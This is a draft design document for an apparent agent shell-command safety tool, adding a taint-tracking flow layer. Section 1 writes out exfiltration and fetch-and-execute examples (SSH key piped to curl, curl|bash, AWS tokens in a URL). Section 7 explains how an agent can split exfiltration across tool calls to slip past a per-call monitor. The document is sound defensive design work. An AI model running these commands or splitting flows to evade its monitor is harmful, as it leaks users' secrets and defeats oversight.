# Information flow & taint — how the model handles data flow

Status: draft (2026-07-01). Adds a flow layer over the per-command profile model.
Feeds `behavioral-taxonomy-v1.md`. References collected in `reading-list.md`.

## 1. Safety is often a property of *flows*, not commands

Every dangerous example below is composed of individually-innocuous parts:

- `cat ~/.ssh/id_rsa | curl -d @- https://x` — read a secret, then send it out.
- `curl https://x/payload | bash` — fetch untrusted bytes, then execute them.
- `psql -c 'select * from users' > /srv/public/dump.csv` — read data, write it public.
- `curl "https://x/?leak=$(aws sts get-session-token)"` — secret into a URL.

No single command is the vulnerability; the **flow from a source to a sink** is.
The per-capability profile (what one command-form does) cannot see this. We need a
flow layer, and the theory for it is 50 years old (Denning's lattice; Bell-LaPadula
for confidentiality; Biba for integrity — see `reading-list.md`).

## 2. Two dual flows — both matter, and they behave differently

- **Confidentiality flow** (Bell-LaPadula / Denning): data from a **high-secrecy
  source** must not reach a **sink whose audience is broader than the data's
  allowed audience**. Leak = secret → public. "No read-up / no write-down."
- **Integrity flow** (Biba, the dual): data from a **low-integrity source**
  (network, untrusted file, external input) must not reach a **high-integrity
  sink** (`execute`, `configure`, `authorize`, privileged op). Injection =
  untrusted → executed. "No read-down / no write-up."

**The facets already are the labels.** We don't add new axes; we *read* existing
ones as lattice labels:
- confidentiality **source** level = the `secret` facet + remote-private reads;
- confidentiality **sink** audience = the `disclosure` facet (`local-process` …
  `public`) and outbound `network` payload;
- integrity **source** level = `execution`-provenance / supply-chain `source`
  (self / caller / registry / unverified-url) applied to *data* origin;
- integrity **sink** level = `execute` / `configure` / `authorize` capabilities.

## 3. The shell hands us an explicit dataflow graph

Unlike a general program, a command line's data edges are *visible in the CST*:

| construct | edge |
|---|---|
| `a \| b` | a.stdout → b.stdin |
| `$(a)` / `` `a` `` | a.stdout → surrounding argument |
| `a > f`, `a >> f` | a.stdout → file f |
| `b < f` | file f → b.stdin |
| `<(a)` / `>(a)` | a.output ↔ file arg |
| `<<<w`, `<<EOF` | literal → stdin |
| `X=$(a); … $X` | a.stdout → variable → use (needs var tracking) |
| env / exported vars | value → child process env |

So a command line is a graph: **nodes = command invocations** (each with a
profile that marks it a source and/or a sink), **edges = these constructs**. Flow
analysis is a reachability check over that graph.

## 4. Labels and worst-case resolution

Each node's output carries a derived **(confidentiality, integrity)** label:
- confidentiality(out) = max over what the node read (secret file → `secret`;
  private remote → `internal`; nothing sensitive → `public`);
- integrity(out) = min over the node's input provenance (network/untrusted →
  `low`; caller-typed literal → `high`).

Unknowns resolve to **worst-case** (the recurring rule): an argument-derived
source we can't pin is treated as maximally secret *and* minimally trusted; an
unresolved sink audience is treated as `public`.

## 5. Flow rules

Over the dataflow graph, for the active level's flow policy:
- **Confidentiality:** for every path source→sink, `confidentiality(source) ≤
  audience(sink)`. A `secret` source reaching a `public`/`shared-remote`/
  outbound-send sink violates it.
- **Integrity:** for every path source→sink, `integrity(source) ≥
  requirement(sink)`. A `low`-integrity source reaching an `execute`/`configure`
  sink violates it (`curl | bash`, `eval "$(untrusted)"`, redirect into
  `.git/hooks`).

## 6. Declassification and endorsement (the escape valves)

Pure "no flow" is too strict — real work moves secrets and runs fetched code on
purpose. IFC handles this with explicit trust-lowering/raising nodes:
- **Declassifiers** lower an output's confidentiality: `gpg -e`/`age` (encrypt),
  `sha256sum` (one-way digest), redaction/`--redact`. `secret | gpg -e | curl` is
  allowed because the encryptor declassifies.
- **Endorsers** raise integrity: signature/hash verification, schema validation.
  `curl … | verify-sig | bash` is different from `curl | bash`.
- **Explicit allowance**: a level or trusted-config entry may bless a specific
  flow. This is DIFC's declassify-with-authority, reusing the trusted-config
  model from v0.205.0.

Declassifiers/endorsers become **capability kinds** in the taxonomy, and their
presence on a path is what makes an otherwise-forbidden flow admissible — a
precise, describable rule, not a judgment call.

## 7. The hard truth: prevent vs. detect

The two flows are **not equally enforceable**, and stating why is important.

- **Integrity flows are locally visible → preventable.** `curl | bash`, `eval`,
  redirect-to-hook, `make` from a repo — the untrusted-source→exec-sink edge sits
  inside one command line or one config write. safe-chains already prevents
  exactly these (execution=network-sourced on a pipeline, eval-safety,
  redirect-target gating, config-trust). The IFC model *explains* our existing
  defenses: **they are all integrity-flow enforcement.**
- **Confidentiality flows can be split across tool-calls → not fully preventable
  per-invocation.** An agent can run `cat secret > /tmp/x` (call 1: an ordinary
  local write) and later `curl -d @/tmp/x https://x` (call 2: an ordinary send of
  a local file). Neither call, seen alone, is exfiltration. A per-invocation
  mediator cannot see the flow.

Conclusion, stated honestly: **safe-chains prevents integrity/injection/
confused-deputy flows; for confidentiality it can detect-and-warn within a single
command line but cannot guarantee prevention of exfiltration across calls.** This
is not a gap to paper over — it is the same fact already in `security.md` ("reads
can leak"), now given its principled name. It is also why the agent case is the
sharp one: an agent is the orchestrator that assembles the multi-call flow.

This is exactly Simon Willison's **"lethal trifecta"** for agents — access to
private data + exposure to untrusted content + a way to exfiltrate — which is
just Denning's lattice restated: a confidentiality source, an integrity source,
and a confidentiality sink, all reachable to one deputy.

## 8. Cross-invocation flow — the session-taint option (future)

To move confidentiality from *detect* toward *prevent*, safe-chains would need
**session-level taint state**: remember that a secret was read (into stdout, a
var, or a file) earlier this session, and label subsequent sinks accordingly. That
turns the stateless per-invocation hook into a stateful monitor — a real
architectural step (it needs a session store; the trusted-config/state work is
the nearest precedent). Even then it's best-effort (files persist across sessions;
labels get lost through copies). Record as a design option, not a v1 commitment.

## 9. Feedback into the model

- **No new facets.** Confidentiality and integrity labels are *derived* from the
  existing `secret`/`disclosure`/`network`/`execution`-provenance facets. This is
  a validation of the facet set: the flow theory reuses it.
- **New engine pass:** build the CST dataflow graph (edges already parseable),
  attach source/sink labels from node profiles, run the two reachability checks
  under the level's flow policy.
- **New capability kinds:** `declassifier`, `endorser` — the nodes that make
  forbidden flows admissible.
- **Levels gain a flow policy** (two toggles + thresholds): "no `secret`→
  outbound-send," "no low-integrity→`execute`." The legacy tiers implicitly
  enforced the integrity half; making it explicit is strictly clarifying.
- **Prevent/detect split is doctrine:** enforce integrity flows; treat
  confidentiality-out as detect-within-a-line + honest non-guarantee across calls,
  with session-taint as the opt-in path to stronger confidentiality.
